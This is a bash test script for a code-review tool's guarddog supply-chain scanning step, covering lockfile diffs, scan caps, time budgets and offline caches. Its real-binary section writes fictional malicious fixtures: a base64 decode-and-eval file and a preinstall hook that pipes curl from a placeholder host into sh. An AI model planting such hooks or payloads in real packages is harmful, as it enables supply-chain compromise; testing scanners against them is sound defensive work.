#!/usr/bin/env bash
# review_checks.sh guarddog step: an npm package a changed package-lock.json newly adds (name@version absent from the merge-base lock) that is installed under node_modules AT THE LOCKED
# VERSION is scanned with `guarddog npm scan DIR`: hasInstallScript packages first, a cap of 25 and a total time budget (what they leave out is named in a not-checked row), never `verify`, never a
# registry fetch (guarddog reads a non-directory argument as a registry package name), stub top-package caches keep guarddog offline (plus a dead proxy once --no-sandbox drops its own network block),
# guarddog 3.x only, one [heuristic] lead per threat-* rule (capability-* stays quiet), a rule error keeps the other hits, control characters never drop a row, code and match snippets never reach
# the output, and a newly added lock entry with hasInstallScript is a lead of its own.
# Shim cases: found, clean, crash, bad JSON, no threat rule, rule errors, wrong version, nested sandbox, --full, missing, cap, time budget, removal-only lock, nothing installed, stale install, no lock
# at base, v1 lock, moved base, control characters, hasInstallScript leads.
# Real-binary section (host-only: CI has no guarddog install, so it is skipped there): a fictional flagged package and a clean one, root and nested install hooks, and a control proving the no-egress check can fail.
set -euo pipefail
export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null # hermetic git: no host config (signing, hooks, default branch)
unset HTTP_PROXY HTTPS_PROXY ALL_PROXY NO_PROXY http_proxy https_proxy all_proxy no_proxy # the PX log below must show only a proxy that review_checks.sh sets
ROOT=$(cd "$(dirname "$0")/.." && pwd)
RC=${REVIEW_CHECKS:-$ROOT/.claude/skills/deep-code-review/scripts/review_checks.sh}
H=$ROOT/.claude/skills/deep-code-review/references/tool-hub.md
T=$(mktemp -d "${TMPDIR:-/tmp}/gdt.XXXXXX") && [ -n "$T" ] && [ -d "$T" ] || { echo "no temp dir" >&2; exit 1; }
trap 'cd /; rm -r -- "$T"' EXIT; fail=0
ok() { echo "ok - $1"; }; bad() { echo "FAIL - $1"; fail=1; }
export PERUN_HEAVY_DIR="$T/heavy" DCR_CACHE_ROOT="$T/nocache" DCR_USER_BIN='' GD_LOG="$T/gd.log" # DCR_USER_BIN empty: a guarddog in ~/.local/bin cannot answer a "missing" case
unset GUARDDOG_TOP_PACKAGES_CACHE_LOCATION
mkdir -p "$T/sys" "$T/base" "$T/gd" "$T/outside"
# Hermetic PATH: shim dir, inert stubs for the older scanners and $T/sys (symlinks to only the system binaries review_checks.sh needs), never the host PATH.
for b in bash env git grep sed head tail cat rm mkdir mktemp dirname basename python3 perl timeout gtimeout jq true sort uniq paste tr cut wc awk date cp mv ls find touch tee readlink sleep; do
  p=$(type -P "$b") || continue; ln -s "$p" "$T/sys/$b"
done
printf '#!/bin/sh\necho %s\n' "'{\"results\":[],\"errors\":[]}'" >"$T/base/semgrep"
printf '#!/bin/sh\necho %s\n' "'{\"Results\":[]}'" >"$T/base/trivy"
printf '#!/bin/sh\nexit 0\n' >"$T/base/gitleaks"
# Fake guarddog: answers --version (GD_VERSION, GD_VER_RC; logs nothing), otherwise logs argv, target and proxy, checks the offline cache variable and prints canned JSON
# (GD_MODE: crash|bad|nothreat|errors|nested; GD_SLEEP seconds per scan). CANARY-* stand for source snippets. The nested sandbox failure is guarddog's real stderr (capital S).
cat >"$T/gd/guarddog" <<'S'
#!/usr/bin/env bash
[ "${1:-}" != --version ] || { echo "${GD_VERSION:-3.2.0}"; exit "${GD_VER_RC:-0}"; }
echo "ARGS $*" >>"$GD_LOG"; for last; do :; done; echo "LAST $last" >>"$GD_LOG"; echo "PX ${HTTPS_PROXY:-none}" >>"$GD_LOG"
[ -d "$last" ] || echo "NODIR $last" >>"$GD_LOG"
python3 -I -c 'import json,sys,time
d=sys.argv[1]; assert d
for k in ("npm","pypi","rubygems","go"):
    j=json.load(open(d+"/top_"+k+"_packages.json")); assert time.time()-j["downloaded_timestamp"]<3600 and j["packages"]' "${GUARDDOG_TOP_PACKAGES_CACHE_LOCATION:-}" 2>/dev/null && echo "CACHE ok" >>"$GD_LOG" || echo "CACHE bad" >>"$GD_LOG"
[ -z "${GD_SLEEP:-}" ] || sleep "$GD_SLEEP"
case "${GD_MODE:-}" in
  crash) exit 9 ;;
  bad) echo '{"unexpected":1}'; exit 0 ;;
  nothreat) echo '{"package":"p","results":{"capability-x":{}},"errors":{},"issues":0}'; exit 0 ;;
  errors) echo '{"package":"p","results":{"threat-x":{},"threat-y":[{"location":"a.js:1","code":"CANARY-CODE-5","match":"CANARY-MATCH-5","message":"Spawns a shell"}]},"errors":{"threat-x":"failed to run rule: boom"},"issues":1}'; exit 0 ;;
  nested) case " $* " in *" --no-sandbox "*) echo "WARNING: Scanning without kernel-level sandbox protection." >&2 ;; *) echo "ERROR: Error occurred while scanning target $last: 'Sandbox initialization failed: Operation not permitted'" >&2; exit 1 ;; esac ;;
esac
case "$last" in
  *acme-flagged) echo '{"package":"acme-flagged","results":{"capability-process-spawn":[{"location":"index.js:3","code":"CANARY-CODE-1","match":"CANARY-MATCH-1","message":"Spawns a process"}],"threat-runtime-obfuscation-base64exec":[{"location":"index.js:2","code":"CANARY-CODE-2","match":"CANARY-MATCH-2","message":"Decodes a base64 string and executes it"},{"location":"lib/b.js:7","code":"CANARY-CODE-3","match":"CANARY-MATCH-3","message":"Decodes a base64 string and executes it"}],"threat-network-exfiltration":[{"location":"x/y.js:1","code":"CANARY-CODE-4","match":"CANARY-MATCH-4","message":"Sends local data to a remote host"}],"threat-npm-preinstall-script":{}},"errors":{},"issues":4,"risk_score":{"score":7.3,"label":"high_risk"},"risks":[]}' ;;
  *acme-cr) echo '{"package":"acme-cr","results":{"threat-x":[{"location":"lib/ev\rl.js:4","code":"CANARY-CODE-6","match":"CANARY-MATCH-6","message":"Bad\rthing"}]},"errors":{},"issues":1}' ;;
  *) echo '{"package":"p","results":{"capability-process-spawn":{},"threat-network-exfiltration":{}},"errors":{},"issues":0,"risk_score":{},"risks":[]}' ;;
esac
S
chmod +x "$T/base/semgrep" "$T/base/trivy" "$T/base/gitleaks" "$T/gd/guarddog"
G() { git -c user.email=t@example.com -c user.name=t "$@"; }
newrepo() { # newrepo NAME: a fresh repo $T/NAME (refuses one outside $T); node_modules stays untracked
  mkdir -p "$T/$1" && cd "$T/$1" && git init -q . && case "$(git rev-parse --show-toplevel)" in "$(cd "$T" && pwd -P)"/*) ;; *) echo "refusing: repo not under temp dir" >&2; exit 1 ;; esac
  echo 'node_modules/' >.gitignore
}
lock() { # lock FILE KEY=VERSION...: a lockfileVersion 3 package-lock.json; VERSION link = a workspace link entry, none = an entry with no version, a trailing +s sets hasInstallScript
  python3 -I - "$@" <<'PY'
import json, sys
pk = {"": {"name": "app", "version": "1.0.0"}}
for e in sys.argv[2:]:
    k, v = e.split("=")
    if v == "link": pk[k] = {"resolved": "packages/ws", "link": True}
    elif v == "none": pk[k] = {"resolved": "https://example.invalid/x.tgz"}
    else:
        pk[k] = {"version": v.replace("+s", "")}
        if v.endswith("+s"): pk[k]["hasInstallScript"] = True
json.dump({"name": "app", "lockfileVersion": 3, "packages": pk}, open(sys.argv[1], "w"))
PY
}
pkgdir() { mkdir -p "$1"; echo 'module.exports = 1;' >"$1/index.js"; printf '{"name":"x","version":"%s"}\n' "$2" >"$1/package.json"; } # an installed package at version $2
commit() { G add -A && G commit -q -m "$1"; }
GP="$T/gd:$T/base:$T/sys"
run() { : >"$GD_LOG"; PATH="$GP" bash "$RC" --base base "$@" 2>"$T/err" >"$T/out"; }
jqa() { jq -e "$1" "$T/out" >/dev/null; }
nlog() { grep -c "$1" "$GD_LOG" || true; }
FIND='[.[]|select(.tool=="guarddog" and .rule!="not-checked")]'
NC='any(.[]; .tool=="guarddog" and .rule=="not-checked")'

# A: lock under app/. New: bumped (1.0.0 -> 1.1.0), acme-flagged, acme-clean, @acme/scoped, a nested dep, acme-absent (not installed), acme-escape (symlink out of the repo).
newrepo a && mkdir -p app && lock app/package-lock.json node_modules/old-pkg=1.0.0 node_modules/bumped=1.0.0 node_modules/gone=1.0.0 && commit base && git branch base
lock app/package-lock.json node_modules/old-pkg=1.0.0 node_modules/bumped=1.1.0 node_modules/acme-flagged=1.0.0 node_modules/acme-clean=1.0.0 node_modules/@acme/scoped=2.0.0 \
  node_modules/acme-clean/node_modules/deep=3.0.0 node_modules/acme-absent=1.0.0 node_modules/acme-escape=1.0.0 node_modules/ws-link=link packages/ws=1.0.0
for p in old-pkg:1.0.0 bumped:1.1.0 acme-flagged:1.0.0 acme-clean:1.0.0 @acme/scoped:2.0.0 acme-clean/node_modules/deep:3.0.0; do pkgdir "app/node_modules/${p%:*}" "${p##*:}"; done
pkgdir "$T/outside" 1.0.0; ln -s "$T/outside" app/node_modules/acme-escape; commit head # acme-escape has the locked version, so only the repo-boundary test can stop it
R=$(pwd -P); run
[ "$(nlog '^LAST ')" = 5 ] && ok "A: the 5 new installed packages are scanned" || bad "A: 5 scanned (got $(nlog '^LAST '))"
for p in bumped acme-flagged acme-clean @acme/scoped acme-clean/node_modules/deep; do grep -qxF "LAST $R/app/node_modules/$p" "$GD_LOG" && ok "A: scans $p by absolute path" || bad "A: scans $p"; done
for p in old-pkg acme-absent acme-escape gone ws-link; do ! grep -q "node_modules/$p\$" "$GD_LOG" && ok "A: does not scan $p" || bad "A: scanned $p"; done
[ "$(nlog '^ARGS npm scan --output-format json /')" = 5 ] && ! grep -qE ' verify|NODIR' "$GD_LOG" && ok "A: npm scan on existing dirs only, never verify" || bad "A: argv shape"
[ "$(nlog '^CACHE ok')" = 5 ] && [ "$(nlog '^PX none$')" = 5 ] && ok "A: every call carries fresh stub top-package caches (no startup refresh) and no proxy of its own" || bad "A: stub caches"
jqa "any(.[]; .tool==\"guarddog\" and .rule==\"threat-runtime-obfuscation-base64exec\" and .file==\"app/node_modules/acme-flagged/index.js\" and .line==2 and (.message|startswith(\"acme-flagged@1.0.0: 2 hit(s)\")))" && ok "A: one lead per rule with the first location, hit count and package@version" || bad "A: base64exec lead"
jqa 'any(.[]; .tool=="guarddog" and .rule=="threat-network-exfiltration" and .file=="app/node_modules/acme-flagged/x/y.js" and .line==1)' && ok "A: second rule is its own lead" || bad "A: exfiltration lead"
jqa "$FIND|length==2" && ok "A: capability-* and empty threat-* rules give no lead (2 leads in all)" || bad "A: lead count"
jqa "$FIND|all(.message|endswith(\" [heuristic]\"))" && ok "A: every lead is tagged [heuristic]" || bad "A: heuristic tag"
! grep -q CANARY "$T/out" "$T/err" && ok "A: code and match snippets never reach the output" || bad "A: snippet leaked"
grep -q 'analyzers ran:.*guarddog(scanned-5-of-7)' "$T/err" && grep -q 'partial:.*guarddog(scanned-5-of-7)' "$T/err" && jqa "$NC and any(.[]; .tool==\"guarddog\" and (.message|contains(\"scanned 5 of 7\")) and (.message|contains(\"2 not installed at the locked version\")))" && ok "A: partial scope is named, never a clean 'ran'" || bad "A: partial scope"
grep '^review_checks: ran ' "$T/err" | grep -qvE 'not run: [^;]*guarddog' && ok "A: the summary line does not list guarddog as not run" || bad "A: summary line"
GD_MODE=crash run
grep -q 'not run: guarddog (exit 9)' "$T/err" && ! grep -qE 'analyzers ran:.*guarddog' "$T/err" && jqa "$NC" && jqa "$FIND|length==0" && ok "A: crash is not-run, not clean" || bad "A: crash"
for m in bad nothreat; do
  GD_MODE=$m run
  grep -q 'not run: guarddog (unparseable output' "$T/err" && ! grep -qE 'analyzers ran:.*guarddog' "$T/err" && jqa "$NC" && jqa "$FIND|length==0" && ok "A: $m output is not-run, not clean" || bad "A: $m output"
done
GD_MODE=errors run # one rule errors on every package: its hits are missing, the other rule's hits stay
jqa "$FIND|length==5 and all(.rule==\"threat-y\")" && jqa 'any(.[]; .tool=="guarddog" and .rule=="not-checked" and (.message|startswith("acme-flagged@1.0.0: rule threat-x did not run (failed to run rule: boom)")))' \
  && jqa 'any(.[]; .tool=="guarddog" and .rule=="not-checked" and (.message|contains("5 scanned with a rule that did not run")))' && grep -q 'partial:.*guarddog(scanned-0-of-7)' "$T/err" && ! grep -q CANARY "$T/out" \
  && ok "A: a rule error keeps the other hits and names the failed rule as not-checked, per package" || bad "A: rule error"
GD_MODE=nested run
[ "$(nlog '^ARGS')" = 6 ] && [ "$(nlog '^ARGS .*--no-sandbox')" = 5 ] && grep -q 'kernel sandbox unavailable' "$T/err" && jqa "$FIND|length==2" && ok "A: a nested sandbox failure (guarddog's real, capitalised stderr) retries once with --no-sandbox, then keeps the flag" || bad "A: nested sandbox ($(nlog '^ARGS') calls)"
[ "$(nlog '^PX http://127.0.0.1:9$')" = 5 ] && [ "$(nlog '^PX none$')" = 1 ] && ok "A: the --no-sandbox retries run behind a dead proxy, the sandboxed call does not" || bad "A: dead proxy on the retry"
run --full
grep -q 'not run: guarddog (SKIPPED: --full' "$T/err" && [ ! -s "$GD_LOG" ] && jqa "$NC" && ok "A: --full has no base: one SKIPPED line, nothing scanned" || bad "A: --full"
GP="$T/base:$T/sys" run
grep -q 'not run: guarddog (not installed)' "$T/err" && grep -q 'missing tools:.*guarddog (install: pipx install guarddog)' "$T/err" && jqa "$NC" && ok "A: missing guarddog is named with its install hint" || bad "A: missing"
GP="$T/gd:$T/base:$T/sys"

# B: 30 new installed packages: the first 25 are scanned, the other 5 are named.
newrepo b && lock package-lock.json && commit base && git branch base
a=(); for i in $(seq -w 1 30); do a+=("node_modules/pk$i=1.0.0"); pkgdir "node_modules/pk$i" 1.0.0; done; lock package-lock.json "${a[@]}"; commit head; run
[ "$(nlog '^LAST ')" = 25 ] && grep -q 'LAST .*pk25$' "$GD_LOG" && ! grep -q 'pk26$' "$GD_LOG" && grep -q 'analyzers ran:.*guarddog(scanned-25-of-30)' "$T/err" && ok "B: cap 25 of 30, named as partial" || bad "B: cap ($(nlog '^LAST ') scanned)"
jqa 'any(.[]; .tool=="guarddog" and .rule=="not-checked" and (.message|contains("over the cap of 25")) and (.message|contains("not scanned: pk26@1.0.0, pk27@1.0.0, pk28@1.0.0, pk29@1.0.0, pk30@1.0.0")))' && ok "B: the packages over the cap are named in a not-checked row" || bad "B: cap names"

# C: a lock change that only removes a package adds nothing: silent.
newrepo c && lock package-lock.json node_modules/a=1.0.0 node_modules/b=1.0.0 && commit base && git branch base
lock package-lock.json node_modules/a=1.0.0; pkgdir node_modules/a 1.0.0; commit head; run
! grep -qi guarddog "$T/err" && [ ! -s "$GD_LOG" ] && jqa 'any(.[]; .tool=="guarddog")|not' && ok "C: removal-only lock change is silent" || bad "C: removal only"

# D: new packages, none installed: one SKIPPED line.
newrepo d && lock package-lock.json && commit base && git branch base
lock package-lock.json node_modules/acme-absent=1.0.0; commit head; run
[ "$(grep -c '^review_checks: not run: guarddog' "$T/err")" = 1 ] && grep -q 'not run: guarddog (SKIPPED: none of 1 newly added packages' "$T/err" && grep -q 'NOT RUN:.*guarddog (SKIPPED' "$T/err" && [ ! -s "$GD_LOG" ] && jqa "$NC" && ok "D: nothing installed: one SKIPPED line, no scan" || bad "D: nothing installed"

# E: no lock at the base: every package is new; all scanned, so plain "ran" with no partial token.
newrepo e && commit base && git branch base
lock package-lock.json node_modules/p1=1.0.0 node_modules/p2=2.0.0; pkgdir node_modules/p1 1.0.0; pkgdir node_modules/p2 2.0.0; commit head; run
[ "$(nlog '^LAST ')" = 2 ] && grep -q 'analyzers ran:.*guarddog' "$T/err" && ! grep -q 'guarddog(' "$T/err" && ok "E: no base lock: both scanned, full coverage" || bad "E: no base lock"

# F: a v1 lock has no packages map: one SKIPPED line.
newrepo f && lock package-lock.json && commit base && git branch base
echo '{"lockfileVersion":1,"dependencies":{"x":{"version":"1.0.0"}}}' >package-lock.json; commit head; run
grep -q 'not run: guarddog (SKIPPED: package-lock.json has no packages map' "$T/err" && [ ! -s "$GD_LOG" ] && ok "F: lockfileVersion 1 is a SKIPPED line, not a clean" || bad "F: v1 lock"

# G: the base branch moved on (foo bumped there): only this branch's own new package is new, because the lock is read at the merge-base.
newrepo g && lock package-lock.json node_modules/foo=1.0.0 && commit base && git branch base && G checkout -q -b feature
G checkout -q base && lock package-lock.json node_modules/foo=1.1.0 && commit "base moves on" && G checkout -q feature
lock package-lock.json node_modules/foo=1.0.0 node_modules/newpkg=1.0.0; pkgdir node_modules/foo 1.0.0; pkgdir node_modules/newpkg 1.0.0; commit head; run
[ "$(nlog '^LAST ')" = 1 ] && grep -q 'LAST .*node_modules/newpkg$' "$GD_LOG" && ok "G: lock compared with the merge-base, not the moved base tip" || bad "G: merge-base ($(nlog '^LAST ') scanned)"

# H: a lock-only bump leaves the old code on disk; scanning it would read as clean, so only a copy at the locked version is scanned.
newrepo h && lock package-lock.json node_modules/stale=1.0.0 && commit base && git branch base
lock package-lock.json node_modules/stale=1.1.0; pkgdir node_modules/stale 1.0.0; commit head; run
[ ! -s "$GD_LOG" ] && grep -q 'not run: guarddog (SKIPPED: none of 1 newly added packages is installed under node_modules at its locked version' "$T/err" && jqa "$NC" && ok "H: a lock-only bump (old version on disk) is not scanned and not read as clean" || bad "H: stale install"
lock package-lock.json node_modules/stale=1.1.0 node_modules/fresh=1.0.0; pkgdir node_modules/fresh 1.0.0; commit head2; run
[ "$(nlog '^LAST ')" = 1 ] && grep -q 'LAST .*node_modules/fresh$' "$GD_LOG" && grep -q 'guarddog(scanned-1-of-2)' "$T/err" && jqa 'any(.[]; .tool=="guarddog" and .rule=="not-checked" and (.message|contains("scanned 1 of 2")) and (.message|contains("1 not installed at the locked version")))' && ok "H: beside a current copy, the stale one is counted as not checked" || bad "H: stale beside fresh"
pkgdir node_modules/stale 1.1.0; run
[ "$(nlog '^LAST ')" = 2 ] && grep -q 'analyzers ran:.*guarddog' "$T/err" && ! grep -q 'guarddog(' "$T/err" && ok "H: once the locked version is installed, both are scanned" || bad "H: upgraded copy"

# I: only guarddog 3.x scans: any other --version answer is a named not-checked row and nothing is scanned (a hasInstallScript lead stands regardless).
newrepo i && lock package-lock.json && commit base && git branch base
lock package-lock.json node_modules/p1=1.0.0+s; pkgdir node_modules/p1 1.0.0; commit head
for v in 2.9.0 13.2.0 'not a version'; do
  GD_VERSION=$v run
  grep -q 'not run: guarddog (SKIPPED: needs guarddog 3.x' "$T/err" && [ ! -s "$GD_LOG" ] && jqa "$NC" && jqa "$FIND|length==0" && jqa 'any(.[]; .tool=="package-lock")' && ! grep -qE 'analyzers ran:.*guarddog' "$T/err" && ok "I: --version '$v' is not-checked, nothing scanned" || bad "I: version $v"
done
GD_VER_RC=1 run
grep -q 'not run: guarddog (SKIPPED: needs guarddog 3.x' "$T/err" && [ ! -s "$GD_LOG" ] && ok "I: a failing --version is not-checked" || bad "I: failing --version"
run
[ "$(nlog '^LAST ')" = 1 ] && grep -q 'analyzers ran:.*guarddog' "$T/err" && ok "I: guarddog 3.2.0 scans" || bad "I: 3.2.0"

# J: control characters never drop a row (a \r splits it and the closing summary drops the pieces silently): they become "?", and an entry that cannot be scanned is named.
newrepo j && lock package-lock.json && commit base && git branch base
printf -v crk 'node_modules/ev\ril'; lock package-lock.json "$crk=1.0.0" node_modules/acme-cr=1.0.0 node_modules/nov=none
pkgdir "$crk" 1.0.0; pkgdir node_modules/acme-cr 1.0.0; commit head; run
[ "$(nlog '^LAST ')" = 1 ] && grep -q 'LAST .*acme-cr$' "$GD_LOG" && ok "J: a key with a control character is never passed to guarddog" || bad "J: unsafe key scanned"
jqa "$FIND|length==1 and any(.[]; .rule==\"threat-x\" and .file==\"node_modules/acme-cr/lib/ev?l.js\" and .line==4 and (.message|startswith(\"acme-cr@1.0.0: 1 hit(s): Bad?thing\")))" && ok "J: a hit in a file named with a \\r keeps its row, the \\r shown as ?" || bad "J: control character in a hit"
jqa 'any(.[]; .rule=="not-checked" and (.message|startswith("ev?il@1.0.0: ")) and (.message|contains("not scanned")))' && jqa 'any(.[]; .rule=="not-checked" and (.message|startswith("nov@?: ")))' && ok "J: an unreadable lock entry and a version-less one are named, never dropped" || bad "J: named unreadable entries"
jqa 'any(.[]; .rule=="not-checked" and (.message|contains("scanned 1 of 3 newly added packages in full")))' && ok "J: coverage counts the unreadable entries" || bad "J: coverage"

# K: hasInstallScript packages are scanned first (so the cap and the time budget never leave them out), and the time budget names what it leaves out.
newrepo k && lock package-lock.json && commit base && git branch base
lock package-lock.json node_modules/k1=1.0.0 node_modules/k2=1.0.0 node_modules/k3=1.0.0 node_modules/k4=1.0.0+s; for i in 1 2 3 4; do pkgdir "node_modules/k$i" 1.0.0; done; commit head
R=$(pwd -P); run
[ "$(nlog '^LAST ')" = 4 ] && [ "$(grep '^LAST ' "$GD_LOG" | head -n1)" = "LAST $R/node_modules/k4" ] && ok "K: the hasInstallScript package is scanned first" || bad "K: order"
GD_SLEEP=2 REVIEW_GUARDDOG_BUDGET=2 run
[ "$(nlog '^LAST ')" = 1 ] && grep -q 'LAST .*node_modules/k4$' "$GD_LOG" && grep -q 'guarddog(scanned-1-of-4)' "$T/err" && jqa 'any(.[]; .tool=="guarddog" and .rule=="not-checked" and (.message|contains("over the cap of 25 or the 2s time budget, not scanned: k1@1.0.0, k2@1.0.0, k3@1.0.0")))' && ok "K: over the time budget only the hasInstallScript package is scanned and the rest are named" || bad "K: time budget ($(nlog '^LAST ') scanned)"
REVIEW_GUARDDOG_BUDGET=soon run
[ "$(nlog '^LAST ')" = 4 ] && ok "K: a non-numeric budget falls back to the default" || bad "K: bad budget"

# M: a newly added lock entry with hasInstallScript is a lead of its own (guarddog's install-hook rules never read a package's own root package.json), with or without guarddog, installed or not.
newrepo m && lock package-lock.json node_modules/inst-old=1.0.0+s node_modules/inst-bump=1.0.0+s && commit base && git branch base
lock package-lock.json node_modules/inst-old=1.0.0+s node_modules/inst-bump=2.0.0+s node_modules/inst-new=1.0.0+s node_modules/plain=1.0.0; commit head
LEADS='[.[]|select(.tool=="package-lock")]'
for gp in "$T/gd:$T/base:$T/sys" "$T/base:$T/sys"; do
  GP=$gp run
  jqa "$LEADS|length==2 and all(.rule==\"has-install-script\" and .file==\"package-lock.json\" and .line==0 and (.message|contains(\"hasInstallScript\")) and (.message|endswith(\" [heuristic]\")))" && jqa "$LEADS|map(.message|split(\" \")[0])==[\"inst-bump@2.0.0\",\"inst-new@1.0.0\"]" && ok "M: leads for the newly added hasInstallScript entries only (a bump counts), guarddog ${GP%%:*}" || bad "M: leads ($GP)"
done
GP="$T/gd:$T/base:$T/sys"; run --full
jqa "$LEADS|length==0" && ok "M: --full has no base, so no lead" || bad "M: --full leads"

# Real binary: a fictional flagged package and a clean one, plus root and nested install hooks. A spy keeps guarddog's stderr, where its startup cache-refresh failures print.
GR=$(command -v guarddog 2>/dev/null || true); [ -n "$GR" ] || { [ -x "${HOME:-/nonexistent}/.local/bin/guarddog" ] && GR=$HOME/.local/bin/guarddog || true; }
if [ -z "$GR" ]; then ok "SKIP real guarddog (not installed)"; else
  mkdir -p "$T/rg" "$T/rgerr"
  printf '#!/usr/bin/env bash\ne=$(mktemp "$GD_ERRDIR/e.XXXXXX"); "$GD_REAL" "$@" 2>"$e"; r=$?; cat "$e" >>"$GD_ERR"; cat "$e" >&2; exit $r\n' >"$T/rg/guarddog"; chmod +x "$T/rg/guarddog"
  export GD_REAL=$GR GD_ERRDIR="$T/rgerr" GD_ERR="$T/gd.err"; : >"$GD_ERR"
  newrepo r && lock package-lock.json && commit base && git branch base
  lock package-lock.json node_modules/acme-flagged=1.0.0 node_modules/acme-clean=1.0.0 node_modules/acme-hookroot=1.0.0+s node_modules/acme-hooknest=1.0.0
  mkdir -p node_modules/acme-flagged node_modules/acme-clean node_modules/acme-hookroot node_modules/acme-hooknest/lib
  for p in acme-flagged acme-clean acme-hookroot acme-hooknest; do printf '{"name":"%s","version":"1.0.0"}\n' "$p" >"node_modules/$p/package.json"; done
  printf '// fictional fixture, not real code\nvar s = atob("%s");\neval(s);\n' "$(printf '%s' 'http://example.invalid/payload' | base64 | tr -d '\n')" >node_modules/acme-flagged/index.js
  echo 'module.exports = function add(a, b) { return a + b; };' >node_modules/acme-clean/index.js
  hook='{"name":"hook","version":"1.0.0","scripts":{"preinstall":"curl http://example.invalid/x.sh | sh"}}'
  echo "$hook" >node_modules/acme-hookroot/package.json; echo "$hook" >node_modules/acme-hooknest/lib/package.json; commit head
  px=http://127.0.0.1:9 # a dead proxy: any startup fetch would print "Network error" / "Failed to download"
  : >"$GD_LOG"; HTTPS_PROXY=$px HTTP_PROXY=$px ALL_PROXY=$px https_proxy=$px http_proxy=$px all_proxy=$px NO_PROXY= no_proxy= PATH="$T/rg:$T/base:$T/sys" bash "$RC" --base base 2>"$T/err" >"$T/out"
  jqa 'any(.[]; .tool=="guarddog" and .rule=="threat-runtime-obfuscation-base64exec" and .file=="node_modules/acme-flagged/index.js" and .line==2)' && ok "real: the flagged package gets a base64exec lead at index.js:2" || bad "real: lead"
  jqa "$FIND|map(select(.message|startswith(\"acme-clean@\")))|length==0" && jqa "$FIND|map(select(.rule|startswith(\"capability\")))|length==0" && ok "real: the clean package and capability-* give no lead" || bad "real: clean/capability"
  jqa "$FIND|map(select(.file==\"node_modules/acme-hookroot/package.json\"))|length==0" && jqa "$FIND|any(.[]; .rule==\"threat-npm-preinstall-script\" and .file==\"node_modules/acme-hooknest/lib/package.json\")" \
    && jqa 'any(.[]; .tool=="package-lock" and .rule=="has-install-script" and (.message|startswith("acme-hookroot@1.0.0 ")))' && ok "real: the install-hook rules flag a nested package.json but never a package's own root one, which only the hasInstallScript lead covers" || bad "real: install-hook rule paths"
  grep -q 'analyzers ran:.*guarddog' "$T/err" && ok "real: guarddog listed as ran" || bad "real: ran"
  [ "$(ls "$T/rgerr" | wc -l | tr -d ' ')" -ge 4 ] && ok "real: the spy saw the version probe and every scan" || bad "real: spy saw too few runs"
  ! grep -qE 'Failed to download|Network error' "$GD_ERR" && ok "real: no startup fetch attempted with the stub caches" || bad "real: startup fetch attempted"
  # Control: the same scan without the stub caches (an empty cache dir) must try to download, else the no-fetch check above proves nothing; with fresh stub lists it must not.
  mkdir -p "$T/emptydir" "$T/emptycache" "$T/stubcache"
  for k in npm pypi rubygems go; do printf '{"downloaded_timestamp": %s, "packages": ["example"]}\n' "$(date +%s)" >"$T/stubcache/top_${k}_packages.json"; done
  dead() { env HTTPS_PROXY=$px HTTP_PROXY=$px ALL_PROXY=$px https_proxy=$px http_proxy=$px all_proxy=$px NO_PROXY= no_proxy= GUARDDOG_TOP_PACKAGES_CACHE_LOCATION="$1" "$GR" npm scan --no-sandbox --output-format json "$T/emptydir" 2>&1 || true; }
  case "$(dead "$T/emptycache")" in *"Failed to download"*|*"Network error"*) ok "real: control: a scan without the stub caches does try to download" ;; *) bad "real: control scan fetched nothing, so the no-fetch check proves nothing" ;; esac
  case "$(dead "$T/stubcache")" in *"Failed to download"*|*"Network error"*) bad "real: a scan with the stub caches still tries to download" ;; *) ok "real: a scan with the stub caches does not" ;; esac
fi

# Docs
for s in '`guarddog`' GUARDDOG_TOP_PACKAGES_CACHE_LOCATION REVIEW_GUARDDOG_BUDGET hasInstallScript '[heuristic]' '`*/package.json`'; do grep -qF -- "$s" "$H" && ok "tool-hub.md names $s" || bad "tool-hub.md names $s"; done
grep -qE 'pinact \(`pinact run`\) is the fixer for unpinned-action findings; it needs the GitHub API' "$H" && ! grep -q 'pinact [0-9]' "$H" && ok "tool-hub.md: pinact is the unpinned-action fixer and needs the GitHub API (no unsourced version)" || bad "tool-hub.md pinact line"
exit $fail
